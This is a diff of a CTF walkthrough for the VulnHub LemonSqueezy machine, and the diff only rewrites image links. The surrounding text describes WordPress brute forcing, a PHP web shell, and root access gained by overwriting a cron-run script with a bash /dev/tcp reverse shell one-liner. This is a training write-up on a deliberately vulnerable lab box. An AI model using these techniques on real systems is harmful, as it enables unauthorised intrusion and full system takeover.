@@ -32,7 +32,7 @@ You can download the machine from vulhub: https://www.vulnhub.com/entry/lemonsqu
 ## Enumeration 
 ### Nmap :
 
-![nmap](https://github.com/RawrRadioMouse/rawrradiomouse.github.io/blob/master/assets/images/lemonsqueezy/1.jpg)
+![nmap](/assets/images/lemonsqueezy/1.jpg)
 
 
 Full port scan shows just 80 (HTTP) open.
@@ -44,7 +44,7 @@ however was confident that enumerating with wpscan would yield some information.
 
 As below we get 2 users:
 
-![users](https://github.com/RawrRadioMouse/rawrradiomouse.github.io/blob/master/assets/images/lemonsqueezy/2.JPG)
+![users](/assets/images/lemonsqueezy/2.JPG)
 
 Next I ran good old rockyou against them:
 
@@ -53,7 +53,7 @@ Next I ran good old rockyou against them:
 The first password is found very fast, I left the attack going on lemon but am highly doubtful it will find anything, I will move onto logging in:
 
 
-![password](https://github.com/RawrRadioMouse/rawrradiomouse.github.io/blob/master/assets/images/lemonsqueezy/3.JPG)
+![password](/assets/images/lemonsqueezy/3.JPG)
 
 After seeing we will not be able to upload a shell, I had a look around the panel and found a draft post with a password in it.
 
@@ -64,7 +64,7 @@ Turns out I can set a new password value for lemon, which should allow me to log
 I changed the password to "password" and logged in.
 
 
-![change_pass](https://github.com/RawrRadioMouse/rawrradiomouse.github.io/blob/master/assets/images/lemonsqueezy/4.JPG)
+![change_pass](/assets/images/lemonsqueezy/4.JPG)
 
 Looks like the themes cannot be edited and media cannot be uploaded, seems to be intentionally hardened against this vector - so we will put a malicious plugin together and get shell this way.
 I used a handy tool called wordpwn to spin a malicious plugin together - however I failed to realise that ALL upload functionailty is broken - so this did not work.
@@ -78,7 +78,7 @@ confirmed code execution with whoami:
 
         http://lemonsqueezy/wordpress/wp-content/uploads/shell.php?cmd=whoami
 
-![change_pass](https://github.com/RawrRadioMouse/rawrradiomouse.github.io/blob/master/assets/images/lemonsqueezy/5.JPG)
+![change_pass](/assets/images/lemonsqueezy/5.JPG)
 
 I tried a few reverse shell oneliners however none worked so I gave up and simply hosted a php reverse shell, 
 amended the IP and then grabbed with wget:
@@ -90,7 +90,7 @@ I then started a listener, navigated to the shell I just grabbed and now have a 
         http://lemonsqueezy/wordpress/wp-content/uploads/1.php
 
 
-![low_priv](https://github.com/RawrRadioMouse/rawrradiomouse.github.io/blob/master/assets/images/lemonsqueezy/6.JPG)
+![low_priv](/assets/images/lemonsqueezy/6.JPG)
 
 I upgraded my shell because I am both lazy and fancy
 
@@ -110,7 +110,7 @@ One of the first things I do with a www-data shell is go straight to /var/www/ a
 I was surprised to see user.txt in there, I did not think I would be able to read yet, however I was able to grab the flag - I suspect this means that we will 
 either be pivoting straight to root or be able to read root flag as lemon/orange
 
-![low_priv](https://github.com/RawrRadioMouse/rawrradiomouse.github.io/blob/master/assets/images/lemonsqueezy/7.JPG)
+![low_priv](/assets/images/lemonsqueezy/7.JPG)
 
 *fun fact, flag decodes to "Music can change your life, "
 
@@ -121,14 +121,14 @@ I did not find out anything in here I did not already know, I also manually chec
 After trying linenum and linpeas only linux smart enum gave me some useful info, I suspect this is because the binary was hidden by being called logrotate
 https://github.com/diego-treitos/linux-smart-enumeration
 
-![logrotate](https://github.com/RawrRadioMouse/rawrradiomouse.github.io/blob/master/assets/images/lemonsqueezy/8.JPG)
+![logrotate](/assets/images/lemonsqueezy/8.JPG)
 
 I overwrote the code inside logrotate with a generic bash reverse shell one liner and got a shell back as root.
 
         #!/bin/bash
         bash -i >& /dev/tcp/192.168.20.132/8080 0>&1
 
-![root_proof](https://github.com/RawrRadioMouse/rawrradiomouse.github.io/blob/master/assets/images/lemonsqueezy/9.JPG)
+![root_proof](/assets/images/lemonsqueezy/9.JPG)
 
 The flag by itself does not decode, however if you add it to the second flag you get a profound bit of wisdom.
 I will leave this to the solver to find this :)
